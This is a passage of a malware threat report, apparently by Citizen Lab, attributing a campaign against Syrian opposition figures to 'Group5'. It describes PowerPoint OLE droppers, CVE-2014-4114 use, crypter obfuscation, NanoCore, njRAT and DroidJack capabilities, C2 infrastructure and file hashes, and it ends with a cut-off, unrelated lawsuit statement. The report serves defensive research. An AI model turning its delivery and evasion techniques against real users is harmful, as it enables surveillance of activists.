as DroidJack and other tools, is inconsistent with the TTPs of known groups targeting the Syrian opposition, especially the regime-linked groups. Notably, these groups have shown little ability or appetite for: (a) standing up multifaceted seeding websites; (b) targeting Android users; (c) using exploits in PowerPoint files.\nPreviously reported groups, especially regime-linked groups, have had a tendency to re-use infrastructure, and repurpose similar tools and approaches. It would be surprising for them to suddenly abandon tactics that still “work,” and cease using a C2 infrastructure that cannot be taken down (because it is inside Syria).\nWhile Group5’s tactics have more in common with the group reported in this FireEye report, such as the use of a fake website, COTS .Net malware, and Android malware, there is no direct infrastructure or tool overlap, and only limited evidence of social engineering sophistication (e.g. the use of avatars).\nFurthermore, the lack of technical sophistication, combined with low operational security, suggest that, had this group been previously active for any length of time, it would have run the risk of discovery, perhaps especially given all of the existing reporting about pro-Regime malware groups in Syria.\nUneven Technical Sophistication: The operators showed familiarity with a range of cybercrime tools, yet also committed a range of operational security oversights, such as leaving their logs open and public-facing, connecting via their C2 server, and leaving debugging strings in compiled files. These characteristics would be inconsistent with the work of an in-house government capability.\nIranian Connection: Analysis of the malware and seeding yields a consistent Iranian presence. The binary contains Iranian and Iranian-Persian traces, as do the tools used for obfuscation, which are popular in Iranian cybercrime forums. Similarly, the mailer discovered on the assadcrimes[.]info website is in Persian. There is also the intriguing, but ultimately unproven speculation that the crypter may have been sold to Group5 by a known Iranian malware developer. Furthermore, logs of access to the assadcrimes[.]info site suggest that the operators are working from within Iranian IP space. In addition, the bait content also contains substantial Iranian themes. Finally, the hosting provider (Hostnegar) is Iranian. A final piece of highly circumstantial evidence is that PowerPoint documents containing exploits, albeit often with quite different (and sometimes custom) malware, is a commonly reported feature of many recently-reported Iranian campaigns.\nTargeting Sophistication: Group5 not only targeted a well-connected individual within the Syrian opposition, but also masqueraded as her to register the assadcrimes[.]info site. Both the site and the bait content also indicate a degree of familiarity with the opposition’s concerns and activities, and their targeting indicates they were targeting a key person in opposition politics and multilateral negotiations, yet not highly visible outside of informed circles. Speculatively, the choice of target is indicative of the interests and resources of a state-level actor, or a group receiving direction or providing information to such an actor. A number of governments and non-state actors in the region have an interest in the workings of the opposition, and several are providing direct or indirect support to the Assad Regime. We discuss this possibility in greater detail below in Evaluating Hypotheses.\nHypothesis 2: Known Regime-Linked Group\nA known Regime-linked group has modified its tactics to operate against familiar targets\nFamiliar Targets: The most widely documented threat against the Syrian opposition comes from regime-linked groups, notably malware groups and the Syrian Electronic Army (to a lesser degree). These groups benefit from known links to the regime of Bashar al-Assad, which has a direct and strong interest in monitoring members of the Syrian Opposition, including the groups apparently targeted in this operation. We are familiar with previous operations by regime-linked groups targeting the same organizations.\nModified Tactics: We cannot rule out the possibility that existing groups have added a range of new TTPs to their existing set as the conflict continues.\nRegime-linked groups certainly have the motivation to conduct this operation. Do known groups have the skills to conduct such an operation? There are a range of features of this operation that suggest Group5 may not be a regime-linked group. First, known regime-linked Syrian groups have tended to use a limited set of C2 servers, almost always with at least one server (or a fallback) located within a narrow set of servers within Syria. Group5 does not have a fallback C2 in Syria. Similarly, the servers that Group5 does use are not from companies previously associated with Syrian regime groups, nor is there any prior evidence of regime-linked groups making use of Persian-language tools, or Iranian IP space. Further, known Syrian groups have been active for almost 5 years without evidence of familiarity with PPSX exploits. It is unclear why they would deploy so many new tactics all at once, even they continue to gently iterate on techniques familiar to them.\nOther Syria-Focused Groups? In the introduction we mentioned two other groups that have previously targeted the Syrian opposition: a Lebanon-linked group uncovered in 2014, and an ISIS-linked operation in 2015. The first group, described in a 2015 FireEye Report, coauthored by one of the authors of this report, conducted an extensive campaign against the Syrian opposition. The campaign relied heavily on Arabic-speaking female avatars to flirt with opposition figures and trick them into downloading malware for Windows or Android. That campaign, however, differed in malware tools, infrastructure, and social engineering style from Group5. In addition, it lacked any Persian-language elements, or connection to Iranian IP space.\nIn late 2014 a Citizen Lab report coauthored by one of the authors of this report, identified a malware operation linked to ISIS that targeted Raqqa is Being Slaughtered Silently, a documentation and media group working to uncover human rights abuses in Raqqa and other ISIS-controlled territories. That malware was apparently custom-made but very unsophisticated. Lacking the functionality of a RAT, and exfiltrating via e-mail, the operation was substantially less sophisticated than Group5’s activities. We think it unlikely that the operator behind that malware has (a) grown much more sophisticated, or (b) begun to rely on Iranian tools and hosting providers.\nHypothesis 3: Other Unknown Group\nAn unknown group, not located in Iran and not linked to prior groups\nIt is possible that the operation is the work of some other unknown group. One possibility that we consider is that the operation is a false flag from another state sponsor, deliberately crafted to appear to be an Iranian group. In another, we also consider the other common motivations for such operations, including financial crime.\nA False Flag: Certainly, many other governments are actively interested in information about the Syrian opposition. Given the extensive circumstantial evidence strewn throughout the operation that points to a group based in Iran, one possibility we consider is that the operators are deliberately masquerading as an Iranian group, while acting on behalf of another sponsor.\nIn such a scenario, each of the pieces of circumstantial evidence we have assembled is a string of deliberately planted artifacts, intended to deflect from the threat actor’s true identity. This hypothesis is an intriguing possibility that cannot be conclusively ruled out. However, it is worth asking why, given the noisiness of existing groups targeting the Syrian opposition, a false flag operation would not simply be populated with the many publicly reported strings and other tools associated with pro-regime groups. Similarly, we wonder why a threat actor sophisticated enough to mount such an operation would not also have used more sophisticated malware or seeding techniques.\nFinancial / Commercial Hacking: We find no evidence to suggest that financial crime or commercial espionage played a part in this operation. For a narrowly focused operation, the targeting, for example, does not appear to be geared towards wealthy individuals, or those with access to serious financial resources.\n\nEvaluating Hypotheses\nWe have moderate confidence that the best hypothesis is Hypothesis 1: Iranian Group Newly Active in Syria. The Group5 operation shows strong Iranian connections, with few indicators linked to previously reported groups, including Syrian regime-linked groups. The important caveat is that, perhaps partially by design, we have a limited view on the targets of the campaign, and it is possible that this analysis would change.\nWe further believe that Group5 shows some signs of being state-directed, however we do not have sufficient evidence to link Group5 to a particular government. Two possibilities seem likely: (1) Group5 is working under the control or direction of a government entity within Iran, or sympathetic to such an entity and receiving and sharing information with them; (2) Group5 is collaborating or working on behalf of a government entity within Syria for ideological or mercenary reasons. Both governments are belligerents within the Syrian conflict, and both would have a strong interest in accessing the communications of the Syrian opposition.\nThe Iranian government has been a strong supporter of the regime throughout the conflict, and clearly has an interest in learning and frustrating the political maneuvering of the Syrian opposition. Iranian intelligence and security services have reportedly provided a wide range of military and intelligence gathering assistance to the regime, ranging from troops and training, to electronic monitoring capabilities. At minimum, operators based in Iran certainly would be unlikely to face punishment from their government for work against the Syrian opposition. Speculatively, sponsoring such an operation (held at arm’s length and consigned to a deniable, less experienced group) could provide useful information about the activities and thinking of key individuals within the Syrian Opposition, such as advanced knowledge of negotiating points in multilateral meetings, or internal disagreements.\nImportantly, there is no evidence to directly connect Group5 to any entities within the Iranian government, security establishment, or military. Nor can we rule out the possibility that Group5 is Iran-based, but working on behalf of some other entity.\nThe most perplexing part of the activity we observe is that the operation appears to have been extensively prepared, and then apparently paused after initial seeding. This pause took place not long after Al-Ameer was initially targeted: the website development continued for a period after she had received the initial e-mail, and then ceased. Group5 may have initially targeted Al-Ameer hoping to leverage her well-connected position and digital identity to target others within the Syrian opposition. Theft of her digital identity would explain why her name was used in the WHOIS for assadcrimes[.]info, and why, after failing to infect Al-Ameer, the campaign did not appear to receive much further work, and the infrastructure was ultimately abandoned.\nOther explanations for the pause in activity are possible, and we cannot discount them based on our limited evidence: Group5 may have undergone a shift in the focus of its targeting, concluded that their campaign was ‘blown’ and abandoned it, experienced human resources or political issues, or simply concluded that the operation was using an ineffective technique.\nConclusion\nWhen Syrian opposition figure Noura Al-Ameer sensed something wrong and refrained from clicking, she frustrated a reasonably well put together deception. We suspect she may have been targeted in order to steal her digital identity for the purposes of mounting a larger campaign. Beginning with this initial message, we were able to identify and characterize Group5, a seemingly new entrant into the game.\nWith the identification of Group5, the number of publicly identified operations known to have targeted the opposition with malware has risen to five, at least: Regime-linked groups (Syrian malware groups and the Syrian Electronic Army), a Lebanese Group, ISIS, and most recently Group5. We believe that the most compelling explanation of Group5’s activities is that a group in Iran may be attempting to compromise the communications of the opposition. The circumstantial evidence pointing to an Iranian group is unsurprising, given Iran’s active military engagement in Syria, and the sympathies of many in that country for the Assad regime. However, mindful of the limits of our investigation, we stop short of conclusive statements of attribution about the identity of the operators, or their possible sponsors. We hope that by publishing this report and sharing indicators, our work will be helpful to other researchers who may see pieces of the puzzle that we do not.\nDespite the diversity of the groups targeting the Syrian opposition, they share general features: uneven or low technical sophistication plus good social engineering and well-informed targeting. These elements are characteristic of the majority of malware and phishing operations targeting the Syrian opposition over the past several years.\nThe continued targeting, and entry of new groups, reflects the continued weakness in the Syrian opposition’s digital security, and more generally the risks groups face when using popular online platforms for contested political activities.\nOperators targeting the Syrian opposition plainly do not need sophisticated tools, because easily available malware continues to “work,” when paired with good social engineering. The technical requirement for entering the game is low, enabling unsophisticated groups to achieve successes, while permitting more advanced groups to conserve better techniques for harder targets.\nThe lack of a centralized communications hierarchy can make opposition groups responsive, and quick to adapt. However, decentralization also provides many opportunities for digital exploitation. Operators can target groups for long periods while remaining unnoticed, without fear of being spotted and blocked by a security team. Even when exploitation attempts are noticed, because the security of these groups relies on the behavior of individuals, it can be extremely difficult to ensure that more secure behaviors are adopted.\nOpposition groups and their partners face many challenges, and we appreciate the difficulty of securing behavior. The infrastructure that we analyzed is, at time of writing, apparently abandoned. However, we suspect that Group5, or the interests behind it, may be continuing to pursue efforts to target the opposition. We hope to reinforce the message that continued vigilance is necessary to defend against these operations.\nClick here for some suggestions about how to improve your digital hygiene.

It walks through the distinct droppers, which range from malicious OLEs in a PowerPoint Slideshow file (PPSX) combined with an exploit, to executable files directly containing malware.\n\nDropper Doc 1 (From E-mail 1)\nAssadcrimes.ppsx\nMD5: 76F8142B4E52C671871B3DF87F10C30C\nThis slideshow deploys its malicious payload by (ab)using the OLE object embedding capabilities of PowerPoint.4 Specifically, the malware executable is embedded into the slideshow as an OLE Object of type Package:\nFigure 18: Adding an OLE Package to a PowerPoint document\nOnce embedded, the slideshow “Animation” feature is used to trigger the execution of the object immediately upon viewing the first slide.\nIn one of the malicious PPSX files, we can see the embedded package object by viewing the slides in normal view mode:\nFigure 19: The malicious OLE Package, visible when editing the PPSX\nOnce activated, the embedded object is saved to disk as %TEMP%\\putty.exe, and then executed. This executable is a .Net downloader.\nFigure 20: showing putty.exe (.Net downloader)\nIn Figure 20 we can see that the second stage payload is obtained from the URL http://assadcrimes[.]info/1/dvm.exe [Ref 1]. This second stage executable is saved to disk as %temp%\\dwm.exe [Ref 2], and then executed [Ref 3].\nThe %temp%\\dwm.exe file has the following hashes:\n\n\n\nMD5\nSHA256\n\n\n7d898530d2e77f15f5badce8d7df215e\nc19bc1ff5f8472fb7ba64f33c2168b42ea881a6ae6e134a1cc142e984fb6647f\n\n\n\nThe malware downloaded and executed by the .Net downloader is NanoCore, a well-known RAT (Remote Access Trojan) that enables the remote monitoring of victims via their computers. The NanoCore binary is wrapped using several layers of code obfuscation, which we describe in detail below.\nDeobfuscating the Malware\nThe malware was obfuscated first with crypting, followed by packing before being distributed.\n\nWe will unwrap these steps in reverse order below.\nUnpacking\nThe packer used on this executable employs a simple technique of base64 encoding the PE file and breaking it up into numerous lines which are then embedded into the resource section of the .Net packer stub file. At runtime, the packer reverses this process, then invokes the resulting .Net assembly from memory.\nFigure 21: Base64 strings found in the resource section of the packed executable.\nExtracting this packed code reveals a .Net assembly which is yet another layer of code protection applied using a ‘crypter’. This binary has the following hashes:\n\n\n\nMD5\nSHA256\n\n\na4f1f4921bb11ff9d22fad89b19b155d\nd81ec563387e2ea47bc8ed50fd36e1de955cb2331d6eaae9f966b5d7ab094806\n\n\n\nDecrypting\nThis executable is stub code which performs in-memory AES decryption of a base64 encoded string variable. This string variable holds an encrypted copy of the NanoCore RAT binary.\nFigure 22: the AES decryption routines\nThis encryption of the underlying malware is typically employed to bypass detection by endpoint security controls such as antivirus programs. Many ‘crypter’ tools, as they are known, are available for purchase or trade on various hacking forums.\nOf particular note, this decrypting stub code retained its PDB (short for Program Database) information. PDB file references are common in .Net applications when compiled in ‘debug’ mode, and they frequently reveal the original file path of the application source code on the developer’s computer.\nThis executable revealed the following PDB file path:\nc:\\users\\mr.tekide\\documents\\visual studio 2013\\projects\\paccryptnano core dehgani -vds\\windowsapplication2\\obj\\debug\\launch manager.pdb\nThis PDB string indicates that ‘mr.tekide’ was the username of the developer who compiled this particular stub, and further that it was compiled as part of a Visual Studio project named ‘paccryptnano core dehgani -vds’. In addition, a single subroutine found inside the decrypting stub was named ‘tekide’. The relevance of this PDB string was discussed above in Part 5: Attribution.\nIn order to obtain the intended malware payload from this decrypting stub executable, we created a small .Net application to mimic the decryption steps and output the file to disk. Once complete, we obtained a malicious executable with hashes:\n\n\n\nMD5\nSHA256\n\n\ndd5bedd915967c5efe00733cf7478cb4\na9db5a548ea17d6606bfbdb20306a3a08b38dbfe720f9f709f4d3369288be104\n\n\n\nOriginal NanoCore binary\nNow that we have arrived at the original NanoCore binary, we can examine the configuration as specified by the operator. In order to extract the configuration settings from this copy of NanoCore, we used Kevin Breen’s RATDecoders.\nUsing Breen’s tool we arrived at the following configuration:\nFigure 23: The NanoCore configuration, using Kevin Breen’s RATDecoders\nNotably, 88.198.222[.]163 port 8081 is the command and control channel for this malware. As noted in Part 1, the same IP was also present in the seeding e-mail header.\n\nDropper Doc 2\nassadcrimes1.ppsx\nMD5:F1F84EA3229DCA0CCACB7381A2F49F99\nThis PowerPoint document leverages CVE-2014-4114, a vulnerability in the OLE packager component of the Windows operating system. As described in previous reporting, this vulnerability causes a file embedded within the PowerPoint document to be copied to disk and executed silently on vulnerable systems.\nThe document under examination drops a file named dvm.gif to disk, renames it to dvm.exe and then executes it. This dvm.exe is the same packed and crypted copy of NanoCore as retrieved and executed by the .Net downloader described in the previous section.\n\nDropper Doc 3\nassadcrimes.info.ppsx\nMD5: 30BB678DB3AD0140FC33ACD9803385C3\nThis malicious PowerPoint document uses the same weaponization method described above with respect to Dropper Doc 1. The executable is embedded as an OLE package object, and subsequently executed using animation actions within the PowerPoint slideshow.\nFigure 24: The malicious OLE Package, visible when editing the PPSX\nAs with Dropper Doc 1, activation of the OLE Package object saves the embedded executable to disk as %TEMP%\\putty.exe, then executes it. This file is a .Net application employing the same layers and methods of packing and crypting as seen in the payloads delivered by Dropper Docs 1 and 2. However, the ultimate malware payload in this case is njRat, another well-known RAT tool.\nAfter unpacking the OLE embedded executable putty.exe, we again arrive at a decrypting stub file which will AES decrypt a base64 string variable and run it from memory. The hashes of this file are:\n\n\n\nMD5\nSHA256\n\n\n6161083021b695814434450c1882f9f3\nd72676bbf8de82486c3cebfdad2961cc68a6b564a43f9f987c95320fcd6a330a\n\n\n\nSimilar to the case of Dropper Doc 1 above, we find a PDB entry present in the decrypting stub executable:\nC:\\Users\\mr.tekide\\Documents\\Visual Studio 2013\\Projects\\paccrypt11njratmalii\\paccryptalipnahzade\\obj\\Debug\\LManager.pdb\nAgain we can observe the same username of ‘mr.tekide’ in the project source code path within the PDB string. Further, we note the development path components paccrypt11njratmalii and paccryptalipnahzade.\nTo obtain the malicious njRat executable from this decrypting stub we used the same .Net program we built for use in the Dropper Doc 1 example above. The resulting njRat binary had the following hashes:\n\n\n\nMD5\nSHA256\n\n\nb4121c3a1892332402000ef0d587c0ee\n1a287331e2bfb4df9cfe2dab1b77c9b5522e923e52998a2b1934ed8a8e52f3a8\n\n\n\nInterestingly, the njRat executable appears to have been compiled from source by the same user who compiled the crypter described above. Note the PDB strings found inside the njRat executable:\nC:\\Users\\mr.tekide\\Documents\\Visual Studio 2013\\Projects\\njrat7stubsoures – Copy\\njrat7stubsoures\\obj\\Debug\\dvvm.pdb\nA quick look at the configuration data embedded within this njRat binary reveals the command and control IP address and port:\nFigure 25: The njRAT configuration, showing the C2 and port.\nDecoy Dropper 4\nalshohadaa alatfal.exe\nMD5: 2FC276E1C06C3C78C6D7B66A141213BE\nThis file is a .Net application designed to act as a decoy by displaying a window depicting images of dead children (see Figure: 5). While displaying these images, the decoy application also silently extracts an executable file from the .Net assembly’s resource section, copies it to %TEMP%\\dvm.exe, and then launches a new process from this newly created file. See Figure 26 below:\nFigure 26: Malware dropping code inside the Decoy application\nThe dropper also includes a PDB reference:\nC:\\users\\enterok\\desktop\\slideshow\\slideshow\\obj\\x86\\debug\\alshohadaa alatfal.pdb\nThe dvm.exe file is itself a .Net executable which is packed using the same .Net packer used above in the cases of Dropper Docs 1 – 3. Once unpacked, the resulting file is the same crypted .Net application analysed above from Dropper Doc 3, having MD5 hash 6161083021b695814434450c1882f9f3, and containing the njRat payload.\nMalware Infrastructure\nCommand and Control Server\nEach of the three distinct RAT tools used by Group5 (njRAT, NanoCore RAT, and DroidJack) were configured to communicate with a single command and control server operating on IP address 88.198.222[.]163.\n\n\n\nIP\nReverse DNS PTR\nAssignee\n\n\n88.198.222[.]163\nstatic.88-198-222-163.clients.your-server.de\nHETZNER-RZ-NBG-BLK4\nHetzner Online GmbH\n\n\n\nThis server was the sole point of data exfiltration for each of the malware components. As detailed above for njRAT and NanoCore, and below in Appendix B for DroidJack, the TCP ports used for command and control for each of the RAT tools were as follows:\nFigure 27: RAT ports on the C2 server\nAdditionally, we believe a controller for yet another remote access trojan, XpertRAT, was also hosted on this IP in November 2015; however, we did not uncover any samples designed to communicate with this XpertRAT controller.\nAs noted in the above table, the IP address 88.198.222[.]163 is assigned to Hetzner Online, a Germany based web hosting provider. Hetzner offers web hosting services as well as virtual and dedicated server rentals. Contact was made with Hetzner technical personnel subsequent to the discovery of the malicious activity outlined in this report. A synopsis of this contact is provided in Appendix F: Notification.\nCurrent data available for this IP address suggests that it was likely reprovisioned to a different Hetzner customer in early February 2016 at the latest, and then possibly again in May. A series of domain names associated with online multi-player games were directed to this Hetzner IP, one of which was apparently hosting a malicious HTML document.\nAssadcrimes Web Hosting\nThe assadcrimes[.]info domain name was registered in June 2015, but it remained parked until early October, at which time it was migrated to an Iran-based shared web hosting provider named Hostnegar. This action coincided with the delivery of the initial e-mails outlined in Part 1.\nThe assadcrimes[.]info website was hosted on a shared hosting platform, and as such the IP address associated was also shared by a significant number of other, unrelated, websites.\n\n\n\nIP\nReverse DNS PTR\n\n\n212.7.195[.]171\nserver22.rayanegarco[.]com\n\n\n\nHeaders from the initial e-mail are shown below in Figure 28. These headers indicate that the initial e-mail was most likely sent using the Horde webmail application running on the web hosting server. Furthermore, the headers indicate that the sender was accessing the webmail application from the IP address of the command and control server discussed above.\nFigure 28: Headers from the initial e-mail\nFinally, available domain name service data indicates that the assadcrimes[.]info domain name was moved back to its original parked location on May 4, 2016.\n\nAppendix B: Android Malware Analysis\nThe Malicious APK – Overall Description\n\n\n\n\n\n\n\n\nFigure 29: The malicious application is installed, and appears in the Apps tab (left), while hidden from the Apps list from the Drawer (right)\nUpon execution, the malware is installed and then hidden from the list of installed applications in order to remain covert.\nFigure 30 : The malicious app gives an error ‘App isn’t installed’ when the user tries to open the malware before it disappears from the list.\nAfter the installation, the Application icon will be removed from the installed applications list, yet it will still be running in the background.\nThe APK package in question had the following characteristics:\nAdobe_Flash_Player.apk\nMD5: 8EBEB3F91CDA8E985A9C61BEB8CDDE9D\nThis APK is an instance of DroidJack. According to Symantec, this application evolved from an older codebase known as SandroRAT.\nThe discovered APK sample also contains references to both names, as shown in Figure 31 below:\n\n\n\n\n\n\n\n\nFigure 31: References to both DroidJack and SandroRat as seen in the source code\nThe APK Manifest file reveals important information about the sample’s capabilities and the intentions of its operator. The Android operating system requires information from the Manifest file before the application can execute. This application will request the following permissions and use the following features from the device:\nFigure 32: screenshot from Manifest file with the requested permissions for the APK\nIn the Android system, Activities are components typically used to let the user of the device perform an action. The Main Activity is also defined in the Manifest, pictured in Figure 33.\nFigure 33: Main activity defined in the manifest\nIn this case, the Main Activity is designed to start the Controller as a Service and finish. The controller will be discussed in more detail in the next section.\nAndroid applications can also have Services and Receivers defined. Services are used for background operations while Receivers define the types of broadcast messages the application can receive from other applications as well as the device. These messages are known as Intents.\nThis APK sample enables several services including “Controller,” “GPSLocation” and “Toaster” (See Figure 34).\nFigure 34: Services enabled by the APK\nThe Controller class, referred to by the Main Activity and started as a service on the device, handles the malware operator’s interaction with the application while the GPSLocation class is responsible for obtaining the GPS position from the device’s LocationManager. The Toaster class is not implemented in this APK; however, it is implemented in older SandroRAT samples.\nThe APK file has several Receiver classes defined to handle specific messages from the device (See Figure 35).\nFigure 35: Defined receiver classes\n \n\n\n\nReceiver Intent\nUsage\n\n\nConnectivity Change\nAllows the application to monitor any connectivity changes, including moving between mobile data and Wi-Fi. The constant value is set every time a change occurs.\n\n\nBoot Completed\nAllows the application to re-connect when the device restarts. The constant value is broadcast when the device finishes booting.\n\n\nPhone State\nAllows the application to monitor incoming calls. The constant value is set when the call state is changed.\n\n\n\nThe Connector Receiver simply starts the Controller Service when the phone boots allowing the malware to run in the background upon start up.\nThe CallListener Receiver allows the operator to log when the target makes calls, and record calls (if the operator has enabled it) as an .amr file that can then be sent to the command and control server.\nLastly, in the Manifest file, the Application enables two additional Activities, “CAMSNAP” and “VIDEOCAP,” as shown in Figure 36.\nFigure 36: Activities enabling camera and video capture\nThese allow the operator to use the infected device’s camera to take pictures and record video. This activity is hidden from the victim using a translucent theme.\nThe Malicious APK – The Controller\nAs previously mentioned, the Controller class is ultimately responsible for the rest of the functionality. The instance we analyzed was configured to use the same host as the Windows malware for command and control communication: 88.198.222[.]163.\nFigure 37: DroidJack configuration showing that it shares a host with the other Group5 malware\nWe were able to install a test instance to learn how the malware’s operator could surveil victims. It is clear that the operator would have nearly full access to the victim’s information.\nFeatures offered include:\n\nFile browsing\nSMS and call logging\nContacts\nBrowser history\nApplication Manager\nLocation history\nWhatsApp Reader (only works on rooted devices)\nRemote camera and microphone\n\nFigure 38: DroidJack browsing WhatsApp logs for an infected device.\nSome features will only work on rooted devices. For example, the ability to read WhatsApp messages requires the victim’s device to be rooted. Android apps are unable to access the data from other applications unless they are signed with the same certificate or if the app has been given permission to execute commands as root. If DroidJack is able to acquire root access it can then upload the database on the device where WhatsApp stores its message history.\n\nAppendix C: Mr. Tekide\nThis appendix provides more context on Mr. Tekide, first delving into how we have identified his crypter (PAC Crypt) in strings in the binaries, and second highlighting the results of open source searching for his aliases and related strings.\nSample Correlation With PDB Strings\nIn the Group5 malware samples, we have several PDB file references that suggest that the crypter used with the two distinct RAT tools (njRat and NanoCore) was Mr. Tekide’s ‘PAC Crypt’. For the njRat sample from Dropper Doc 3, we can see the malware stub was compiled by ‘mr.tekide’ as well.\n\n\n\nReference: Doc Dropper 1 Crypter\nMD5: a4f1f4921bb11ff9d22fad89b19b155d\nCompile Time: 9/30/2015 00:02:51\n\n\nc:\\users\\mr.tekide\\documents\\visual studio 2013\\projects\\paccryptnano core dehgani -vds\\windowsapplication2\\obj\\debug\\launch manager.pdb\n\n\n\n \n\n\n\nReference: Doc Dropper 3 Crypter\nMD5:6161083021b695814434450c1882f9f3\nCompile Time: 10/6/2015 02:13:45\n\n\nC:\\Users\\mr.tekide\\Documents\\Visual Studio 2013\\Projects\\paccrypt11njratmalii\\paccryptalipnahzade\\obj\\Debug\\LManager.pdb\n\n\n\n \n\n\n\nReference: Doc Dropper 3 njRat Payload\nMD5:b4121c3a1892332402000ef0d587c0ee\nCompile Time: 10/6/2015 01:23:31\n\n\nC:\\Users\\mr.tekide\\Documents\\Visual Studio 2013\\Projects\\njrat7stubsoures – Copy\\njrat7stubsoures\\obj\\Debug\\dvvm.pdb\n\n\n\n \nThe Visual Studio project folders listed above suggest the particular version of PAC Crypt compiled by Mr. Tekide was being prepared in one case for an njRat payload, and another for a NanoCore payload. The strings ‘dehgani –vds’, ‘malii’ and ‘alipnahzade’ may have additional significance or relevance.\nWe conducted searches across online malware repositories and analysis services (such as VirusTotal, Malwr, and TotalHash) in an effort to acquire additional data relating to the use of PAC Crypt. These searches revealed very little in relation to PAC Crypt specifically, so we instead examined the data for instances of ‘tekide’ related strings found in PDB files.\nIt is our hope that the data or avenue of investigation presented below may be of value to other researchers.\nThe results we examined contained over 200 samples which we then clustered into sets based on compile time and PDB reference as shown in the table below:\n\nThe following compile time / PDB references were also observed in singular instances:\n\nKeeping in mind the limitations of reliance on compile times, we nevertheless were able to compare the noted compile times against the first time samples appeared in common malware repositories such as VirusTotal, Malwr, and TotalHash. In most instances, samples began to appear in malware repositories within hours of the files being compiled. Dynamic analysis of the samples in these sets revealed multiple different payloads and C2 configurations. For example, analysis of the samples in Set A yielded the following payloads and configurations:\n\nFinally, analysis of the compile times observed across the acquired samples suggest a period of activity falling in the latter half of 2014. There are many possible explanations as to why so few samples were observed with compile times beyond 2014: conscious removal of PDB information, a change in personal circumstances, or possibly even a shift to less public malware development activities.\nMr. Tekide on the Internet\nMr. Tekide maintains a visible profile across various malware related web forums, as well as on social media. Searches conducted for this alias provided numerous results which reveal a consistent use of the Mr. Tekide name and avatar, as shown in the images below.\nFigure 39: Mr. Tekide showcasing his ‘ashiyane crypter v.7’ on the Ashiyane forums\n \nFigure 40: Mr.Tekide’s administrator profile on the crypter[.]ir forums\nFigure 41: PAC Crypt page on the crypter[.]ir online shop\nA link found on the ‘Contact’ page of the crypter[.]ir website led to a Facebook profile in the name of ‘Pezhman Blackhat.’ In addition to this Facebook profile, we also identified a LinkedIn profile in which he refers to himself as a ‘crypter,’ and states that he works for the ashiyane digital security team. He also maintains an Instagram profile.\n\nAppendix D: File Hashes\nFull Table of Binaries\n\n\n\nFile\nMD5\nVirusTotal (26-Jul-2016)\nFirst Sub. on VT\n\n\n\n\nDropper Doc 1\n\n\n\n\n\nassadcrimes.ppsx\n76F8142B4E52C671871B3DF87F10C30C\nN/A\nN/A\n\n\nputty.exe [stage1 downloader]\n366908F6C5C4F4329478D60586ECA5BC\nN/A\nN/A\n\n\ndvm.exe [stage 2 payload]\n7D898530D2E77F15F5BADCE8D7DF215E\nN/A\nN/A\n\n\nUnpacked dvm.exe\nA4F1F4921BB11FF9D22FAD89B19B155D\nN/A\nN/A\n\n\nNanoCore RAT payload\nDD5BEDD915967C5EFE00733CF7478CB4\nN/A\nN/A\n\n\nDropper Doc 2\n\n\n\n\n\nassadcrimes1.ppsx\nF1F84EA3229DCA0CCACB7381A2F49F99\nN/A\nN/A\n\n\ndvm.exe\n7D898530D2E77F15F5BADCE8D7DF215E\nN/A\nN/A\n\n\nDropper Doc 3\n\n\n\n\n\nassadcrimes.info.ppsx\n30BB678DB3AD0140FC33ACD9803385C3\nN/A\nN/A\n\n\nputty.exe\n5C4EC3D93A664E4BFA1CE6286CCF0249\nN/A\nN/A\n\n\nUnpacked putty.exe\n6161083021B695814434450C1882F9F3\nN/A\nN/A\n\n\nnjRAT payload\nB4121C3A1892332402000EF0D587C0EE\nN/A\nN/A\n\n\nDecoy Dropper 4\n\n\n\n\n\nalshohadaa alatfal.exe [decoy app]\n2FC276E1C06C3C78C6D7B66A141213BE\nN/A\nN/A\n\n\ndvm.exe [dropped by decoy app]\n494BAB7FD0B42B0B14051ED9ABBD651F\n14 / 55\n2-Mar-2016\n\n\nUnpacked dvm.exe\n6161083021B695814434450C1882F9F3\nN/A\nN/A\n\n\nnjRAT payload\nB4121C3A1892332402000EF0D587C0EE\nN/A\nN/A\n\n\nAndroid Malicious APK (DroidJack)\n\n\n\n\n\nadobe_flash_player.apk\n8EBEB3F91CDA8E985A9C61BEB8CDDE9D\n23 / 53\n5-Jul-2016\n\n\n\nThese hashes are also available via the Citizen Lab Github.\nAppendix E: Email Information\n\n\n\nDate\nSender\nsubject\nIP\nBinary attached\n\n\n\n\n03 Oct 2015 06:05:41 -0700 (PDT)\noffice@assadcrimes.info\nايران تقتل الحجاج في منى\n88.198.222.163\nassadcrimes.ppsx\n\n\n04 Oct 2015 05:47:00 -0700 (PDT)\noffice@assadcrimes.info\nRe: ايران تقتل الحجاج في منى\nRoundCube (212.7.195.171)\nassadcrimes1.ppsx\n\n\n\nAppendix F: Notification\nOn April 12, 2016 we contacted Hetzner via e-mail as well as their abuse form, and informed them that the server was being used to host malware.

    "text": "\n\t\t\t\tA Statement from Professor Ronald Deibert\nOn January 20, 2016, Netsweeper Inc., a Canadian Internet filtering technology service provider, filed a defamation suit with the Ontario Superior Court of Justice. The University of Toronto and myself were named as the defendants. The lawsuit in question pertained to an October 2015 report of the Citizen Lab, “Information Controls during Military Operations: The case of Yemen during the 2015 political and armed conflict,” and related comments to the media. Netsweeper sought $3,000,000.00 in general damages; $500,000.00 in aggravated damages; and an “unascertained” amount for “special damages.”\nOn April 25, 2016, Netsweeper discontinued its claim in its entirety.\nBetween January 20, 2016 and today, we chose not to speak publicly about the lawsuit. Instead, we spent time preparing our statement of defence and other aspects of what we anticipated would be full legal proceedings.\nNow that the claim has been discontinued it is a good opportunity to take stock of what happened, and make some general observations about the experience.\nIt should be pointed out that this is not the first time a company has contemplated legal action regarding the work of the Citizen Lab. Based on emails posted to Wikileaks from a breach of the company servers, we know that the Italian spyware vendor, Hacking Team, communicated with a law firm to evaluate whether to “hit [Citizen Lab] hard.” However, it is the first time that a company has gone so far as to begin litigation proceedings. I suspect it will not be the last.\nFortunately, Ontario has recognized the importance of protecting and encouraging speech on matters of public interest. Canada has historically proven a plaintiff-friendly environment for defamation cases. But, on November 3, 2015, the legal landscape shifted in Ontario when a new law called the Protection of Public Participation Act (PPPA) came into force. It was specifically designed to mitigate against “strategic litigation against public participation,” or SLAPP suits. The Act enumerates its purposes as:\n(a) to encourage individuals to express themselves on matters of public interest;\n(b) to promote broad participation in debates on matters of public interest;\n(c) to discourage the use of litigation as a means of unduly limiting expression on matters of public interest; and\n(d) to reduce the risk that participation by the public in debates on matters of public interest will be hampered by fear of legal action.\nUnder the Act, a judge may dismiss a defamation proceeding if “the person satisfies the judge that the proceeding arises from an expression made by the person that relates to a matter of public interest.” The Act 